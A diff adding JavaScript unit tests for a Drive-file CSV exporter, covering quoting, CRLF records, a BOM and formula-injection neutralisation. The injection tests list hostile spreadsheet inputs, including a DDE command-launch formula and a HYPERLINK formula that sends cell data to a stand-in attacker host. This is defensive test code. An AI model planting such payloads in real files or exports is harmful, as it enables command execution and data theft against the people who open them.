@@ -142,3 +142,117 @@ describe("buildExportItems", () => {
     assert.deepEqual(buildExportItems([], new Map(), new Map(), {}), []);
   });
 });
+
+// ---------------------------------------------------------------------------
+// itemsToCsv (#93)
+// ---------------------------------------------------------------------------
+//
+// This is the function that actually writes the file, and it was the one part
+// of the exporter with no tests at all. Everything it writes is a Drive
+// filename or folder path — text someone else may have chosen, since files and
+// folders shared into your Drive carry the sharer's names.
+
+import { itemsToCsv, csvCell, CSV_BOM } from "../js/exporter.js";
+
+/** Split a CSV into records the way a conforming reader would. */
+const records = (csv) => csv.split("\r\n");
+
+describe("csvCell", () => {
+  // CWE-1236. Excel, Sheets and LibreOffice all evaluate a cell that BEGINS
+  // with one of these. Quoting does not prevent it — a quoted "=HYPERLINK(…)"
+  // is still a live formula — so the guard has to change the value itself.
+  describe("formula injection", () => {
+    for (const evil of [
+      `=cmd|'/c calc'!A1`,
+      `=HYPERLINK("https://evil.example/"&A1,"Open me")`,
+      `+1+1`,
+      `-1+1`,
+      `@SUM(1+1)`,
+      `\tleading tab`,
+      `\rleading cr`,
+    ]) {
+      test(`neutralises ${JSON.stringify(evil.slice(0, 24))}`, () => {
+        const out = csvCell(evil);
+        const inner = out.startsWith('"') ? out.slice(1, -1).replace(/""/g, '"') : out;
+        assert.equal(inner[0], "'", "the cell must no longer begin a formula");
+        assert.ok(inner.includes(evil.slice(1)), "and the original text must survive");
+      });
+    }
+
+    test("an ordinary filename is untouched", () => {
+      assert.equal(csvCell("holiday.jpg"), "holiday.jpg");
+      assert.equal(csvCell("IMG_1234 (1).HEIC"), "IMG_1234 (1).HEIC");
+    });
+
+    // The guard and "looks like a number" share exactly one leading character,
+    // "-", so a negative number is the case that would get mangled into text.
+    test("a plain number is left as a number", () => {
+      assert.equal(csvCell(-42), "-42");
+      assert.equal(csvCell("-42"), "-42");
+      assert.equal(csvCell("-3.5"), "-3.5");
+      assert.equal(csvCell(0), "0");
+      assert.equal(csvCell(1024), "1024");
+    });
+  });
+
+  describe("quoting", () => {
+    test("commas, quotes and newlines are quoted", () => {
+      assert.equal(csvCell("a,b"), '"a,b"');
+      assert.equal(csvCell('say "hi"'), '"say ""hi"""');
+      assert.equal(csvCell("two\nlines"), '"two\nlines"');
+    });
+
+    // The regression: \r was missing, so a name containing a bare carriage
+    // return was written unquoted and split the record.
+    test("a carriage return is quoted", () => {
+      assert.equal(csvCell("before\rafter"), '"before\rafter"');
+    });
+
+    test("null and undefined become empty, not the strings", () => {
+      assert.equal(csvCell(null), "");
+      assert.equal(csvCell(undefined), "");
+    });
+  });
+});
+
+describe("itemsToCsv", () => {
+  const row = (over = {}) => ({
+    group: 1, role: "keep", name: "a.jpg", path: "/My Drive",
+    size: 100, modifiedTime: "", md5Checksum: "", mimeType: "image/jpeg",
+    width: 10, height: 10, similarityPct: 100, matchType: "exact",
+    id: "id1", webViewLink: "", ...over,
+  });
+
+  test("a header plus one record per item", () => {
+    const out = records(itemsToCsv([row(), row({ id: "id2" })]));
+    assert.equal(out.length, 3);
+    assert.ok(out[0].startsWith("group,role,name,path,"));
+  });
+
+  // The one that corrupted everything after it: one row became two records
+  // with the wrong column counts, so every later value landed under the wrong
+  // header.
+  test("a carriage return in a name does not split the record", () => {
+    const out = records(itemsToCsv([row({ name: "before\rafter.jpg" })]));
+    assert.equal(out.length, 2, "header plus exactly one data record");
+    assert.equal(out[0].split(",").length, out[1].split(",").length,
+      "and the data record has the same column count as the header");
+  });
+
+  test("records are separated by CRLF", () => {
+    const csv = itemsToCsv([row()]);
+    assert.ok(csv.includes("\r\n"), "RFC 4180 separator");
+    assert.equal(csv.split("\r\n").length, 2);
+  });
+
+  test("no items still produces the header", () => {
+    assert.equal(records(itemsToCsv([])).length, 1);
+  });
+
+  // Excel reads the encoding from a byte-order mark, not the MIME type, so
+  // without this every accented, CJK or emoji filename opened as mojibake.
+  test("the BOM is a real UTF-8 BOM and is not part of the CSV text itself", () => {
+    assert.equal(CSV_BOM, "﻿");
+    assert.ok(!itemsToCsv([row()]).startsWith(CSV_BOM), "it is prepended at download, not baked in");
+  });
+});
